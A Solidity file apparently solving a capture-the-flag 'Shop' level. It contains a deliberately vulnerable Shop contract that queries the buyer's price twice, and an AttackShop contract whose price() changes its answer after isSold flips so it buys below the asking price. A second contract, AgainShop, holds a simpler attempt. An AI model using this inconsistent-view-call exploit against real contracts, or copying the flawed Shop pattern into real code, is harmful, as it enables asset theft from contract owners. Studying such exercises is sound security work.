// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract AttackShop is Buyer {
    Shop public shop;
    uint public somePrice = 1;
    bool public sold; 

    constructor(address payable _add) public {
      shop = Shop(_add);
    }

    function buyFromShop() public {
      shop.buy();
    }

    function price() public override view returns (uint) {
      return shop.isSold() ? 1 : 100;
    }

    function attack() public {
      shop.buy();
    }
}


contract AgainShop is Buyer {
  Shop public shop;
  bool public sold; 
  uint public somePrice = 1;

  constructor(address payable _add) public {
    shop = Shop(_add);
  }

  function attack() public {
    shop.buy();
    sold = !shop.isSold();
  }

  function price() public override view returns (uint) {
    return somePrice;
  }
}